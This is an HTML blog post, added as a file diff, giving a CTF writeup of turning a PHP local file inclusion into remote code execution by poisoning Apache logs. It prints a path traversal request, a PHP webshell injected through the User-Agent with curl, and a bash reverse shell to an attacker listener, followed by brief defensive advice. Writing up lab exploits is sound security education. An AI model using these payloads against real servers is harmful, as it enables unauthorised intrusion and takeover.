@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>From LFI to RCE via Log Poisoning | Alen Sebastian</title>
+  <meta name="description" content="How I turned a boring file include bug into a full shell — log poisoning, a dash of patience, and one very cooperative Apache server." />
+  <link rel="icon" type="image/jpeg" href="/favicon.png" />
+  <link rel="shortcut icon" type="image/jpeg" href="/favicon.png" />
+  <link rel="apple-touch-icon" href="/favicon.png" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+  <link rel="stylesheet" href="../style.css" />
+</head>
+<body>
+  <div class="bg-grid"></div>
+  <div class="bg-glow glow-1"></div>
+  <div class="bg-glow glow-2"></div>
+
+  <!-- NAV -->
+  <nav class="navbar">
+    <a href="https://alensebastian.in" class="nav-logo">
+      <span class="nav-logo-bracket">&lt;</span>alen<span class="nav-logo-accent">sebastian</span><span class="nav-logo-bracket">/&gt;</span>
+    </a>
+    <div class="nav-links">
+      <a href="../" class="nav-link"><i class="fas fa-arrow-left"></i> All Posts</a>
+      <a href="https://github.com/0xgh0stri13y" target="_blank" class="nav-link"><i class="fab fa-github"></i> GitHub</a>
+    </div>
+  </nav>
+
+  <!-- POST -->
+  <main class="post-page">
+    <article class="post-article">
+
+      <div class="post-article-meta">
+        <a href="../" class="back-link"><i class="fas fa-arrow-left"></i> Back to Blog</a>
+        <span class="post-tag ctf">CTF Writeup</span>
+        <span class="post-date">Mar 09, 2026</span>
+        <span class="read-time"><i class="far fa-clock"></i> 8 min</span>
+      </div>
+
+      <h1 class="post-article-title">From LFI to RCE via Log Poisoning</h1>
+      <p class="post-article-subtitle">
+        How I turned a boring file include bug into a full shell —
+        log poisoning, a dash of patience, and one very cooperative Apache server.
+      </p>
+
+      <div class="post-article-body">
+
+        <p>
+          Okay so this one genuinely made me do a double take. I was expecting a rabbit hole,
+          maybe a dead end or two, the usual CTF experience. Instead the box basically walked me
+          straight into RCE once I stopped being lazy and actually checked what files Apache was
+          writing to. Let me walk through how it went.
+        </p>
+
+        <h2>First look at the app</h2>
+        <p>
+          Popped the IP in the browser and was greeted with what looked like a pretty standard PHP
+          portfolio site. Nothing exciting on the surface. I fired off nmap while I was clicking
+          around — just the usual:
+        </p>
+
+        <pre><code>nmap -sV -sC -p- target.com</code></pre>
+
+        <p>
+          Only port 80 open. The thing that caught my eye immediately was the URL structure.
+          Every page loaded as <code>index.php?page=about</code>, <code>index.php?page=contact</code>
+          and so on. That kind of routing always makes me want to poke at it.
+          Smells like whoever built this is just <code>include()</code>-ing the value directly.
+        </p>
+
+        <h2>Poking at the <code>page</code> parameter</h2>
+        <p>
+          I started manually trying path traversal. The first few attempts returned nothing —
+          blank page, no error, which actually told me something was being included but maybe
+          PHP was silently failing. I switched to the classic <code>/etc/passwd</code> test:
+        </p>
+
+        <pre><code>GET /index.php?page=../../../../etc/passwd HTTP/1.1
+Host: target.com</code></pre>
+
+        <p>
+          And there it was. Full <code>/etc/passwd</code> dumped right into the page response.
+          Beautiful. Honestly I sat there for a second because sometimes you expect these things
+          to be filtered and they just... aren't.
+        </p>
+
+        <p>
+          At this point I had confirmed LFI but I needed to turn it into something useful.
+          The usual tricks — PHP filter wrappers, log files, proc/self/environ — I started
+          working through the list. <code>/proc/self/environ</code> was a dead end, no output.
+          PHP expect wrapper? Disabled. I was starting to think this might just stay as a
+          read-only LFI when I checked Apache logs.
+        </p>
+
+        <pre><code>GET /index.php?page=../../../../var/log/apache2/access.log HTTP/1.1</code></pre>
+
+        <p>
+          Log file was readable. And I could see my own previous requests sitting in there —
+          including the User-Agent strings. That's when it clicked.
+        </p>
+
+        <h2>Poisoning the log</h2>
+        <p>
+          The idea is simple once you see it. Apache writes your User-Agent into the access log
+          exactly as you send it. If you send PHP code as your User-Agent, Apache faithfully logs
+          it. Then when you include the log file via LFI, PHP parses and executes it. You've
+          basically tricked the server into running your code through its own logs.
+        </p>
+
+        <p>
+          I sent the payload using curl — BurpSuite would've worked too but I was already in
+          the terminal:
+        </p>
+
+        <pre><code># Step 1: Inject PHP into the log via User-Agent
+curl -s "http://target.com/" -A '&lt;?php system($_GET["cmd"]); ?&gt;'</code></pre>
+
+        <p>
+          Then triggered execution by including the log and passing a command:
+        </p>
+
+        <pre><code># Step 2: Execute commands through the LFI
+curl "http://target.com/index.php?page=../../../../var/log/apache2/access.log&cmd=id"</code></pre>
+
+        <p>
+          The response came back with <code>uid=33(www-data)</code> sitting right there in the
+          page. At this point I actually said something out loud to nobody in particular.
+          Webshell confirmed.
+        </p>
+
+        <h2>Getting a proper shell</h2>
+        <p>
+          A webshell through curl params is fine but annoying to work with. I set up a listener
+          and URL-encoded a bash reverse shell to send through the <code>cmd</code> parameter:
+        </p>
+
+        <pre><code># Listener on your machine
+nc -lvnp 4444
+
+# Payload (URL encode this before sending)
+bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.X/4444 0&gt;&amp;1'</code></pre>
+
+        <p>
+          One thing I messed up the first time — I forgot to URL-encode the <code>&amp;</code>
+          in the reverse shell payload, so the request got cut off at the ampersand and I got
+          nothing. Sent it through Burp Repeater after encoding it properly and the shell
+          came through clean.
+        </p>
+
+        <p>
+          From there, quick privesc check — <code>sudo -l</code> showed a misconfigured binary
+          running as root and it was over in five minutes. But that's a story for another post.
+        </p>
+
+        <h2>Why this works (and when it doesn't)</h2>
+        <p>
+          Log poisoning relies on two things lining up. The LFI has to be able to reach the
+          log file path — which means the web process needs read access to it, something that's
+          often true on default Apache installs. And Apache (or nginx, or whatever) needs to
+          be logging attacker-controlled input verbatim, which again — default behaviour.
+        </p>
+
+        <p>
+          This specific chain breaks if logs are outside the webroot traversal range, if the
+          PHP process runs as a separate low-privilege user without log access, or if the server
+          uses log rotation that clears the file before you include it. In this box, none of
+          that was the case.
+        </p>
+
+        <p>
+          From a defence perspective — never let your application include arbitrary paths based
+          on user input, obviously. But also make sure your web server logs aren't readable by
+          the application user. Least privilege goes a long way here.
+        </p>
+
+        <hr class="post-divider" />
+
+        <p>
+          This was a genuinely satisfying chain to pull off because each step is so logical in
+          hindsight. LFI alone is limited. But give it a writable (well, a readable-and-poisonable)
+          log file and suddenly you've got full execution. Keep that in mind next time you're
+          staring at a file include param and thinking "this is probably nothing."
+        </p>
+
+        <p class="post-article-footer">
+          Find me on <a href="https://twitter.com/Al3nVettithanam" class="inline-link">Twitter</a>
+          or just shoot me an <a href="mailto:hello@alensebastian.in" class="inline-link">email</a>.
+        </p>
+
+      </div>
+
+    </article>
+  </main>
+
+  <footer class="site-footer">
+    <p>© 2026 <span class="footer-accent">Alen Sebastian</span> · <a href="https://alensebastian.in">alensebastian.in</a></p>
+  </footer>
+</body>
+</html>
